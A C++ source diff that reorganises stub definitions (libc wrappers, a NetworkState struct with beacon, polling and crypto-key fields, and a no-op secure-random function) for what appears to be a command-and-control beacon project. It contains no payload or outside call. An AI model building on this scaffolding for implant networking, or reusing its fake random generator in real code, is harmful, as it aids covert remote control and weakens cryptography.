@@ -8,48 +8,46 @@ struct functionTable;
 
 extern "C" {
 
-void* __malloc(size_t s) { return malloc(s); }
-void  __free(void* p)    { free(p); }
-void* __calloc(size_t n, size_t s) { return calloc(n, s); }
-void* __memcpy(void* d, const void* s, size_t n) { return memcpy(d, s, n); }
-void* __memset(void* d, int v, size_t n) { return memset(d, v, n); }
-int   __memcmp(const void* a, const void* b, size_t n) { return memcmp(a, b, n); }
-size_t __strlen(const char* s) { return strlen(s); }
+    void* __malloc(size_t s) { return malloc(s); }
+    void  __free(void* p)    { free(p); }
+    void* __calloc(size_t n, size_t s) { return calloc(n, s); }
+    void* __memcpy(void* d, const void* s, size_t n) { return memcpy(d, s, n); }
+    void* __memset(void* d, int v, size_t n) { return memset(d, v, n); }
+    int   __memcmp(const void* a, const void* b, size_t n) { return memcmp(a, b, n); }
+    size_t __strlen(const char* s) { return strlen(s); }
 
-int __snprintf(char* buf, size_t n, const char* fmt, ...) {
-    va_list ap;
-    va_start(ap, fmt);
-    int r = vsnprintf(buf, n, fmt, ap);
-    va_end(ap);
-    return r;
+    int __snprintf(char* buf, size_t n, const char* fmt, ...) {
+        va_list ap;
+        va_start(ap, fmt);
+        int r = vsnprintf(buf, n, fmt, ap);
+        va_end(ap);
+        return r;
+    }
+
+    // Minimal struct matching the layout of network/net_internal.h
+    struct NetworkState {
+        struct functionTable* nt;
+        uint8_t* beacon_id;
+        uint8_t* crypto_key;
+        uint32_t seq_num;
+        bool identity_set;
+        bool key_rotation_pending;
+        wchar_t* host;
+        wchar_t* poll_path;
+        wchar_t* submit_path;
+        wchar_t* userAgent;
+        unsigned short port;
+        bool is_https;
+        bool validate_ssl;
+    };
+
+    NetworkState g_state;
+
+    bool is_avx_supported(void) {
+        return false;
+    }
 }
 
-// Minimal struct matching the layout of network/net_internal.h
-struct NetworkState {
-    struct functionTable* nt;
-    uint8_t* beacon_id;
-    uint8_t* crypto_key;
-    uint32_t seq_num;
-    bool identity_set;
-    bool key_rotation_pending;
-    wchar_t* host;
-    wchar_t* poll_path;
-    wchar_t* submit_path;
-    wchar_t* userAgent;
-    unsigned short port;
-    bool is_https;
-    bool validate_ssl;
-};
-
-NetworkState g_state;
-
-bool is_avx_supported(void) {
-    return false;
-}
-
-}
-
-// C++ linkage — callers in net_crypto.cpp and bof_cache.cpp use mangled names
 bool generateSecureRandom(functionTable*, unsigned char*, size_t) {
     return true;
 }
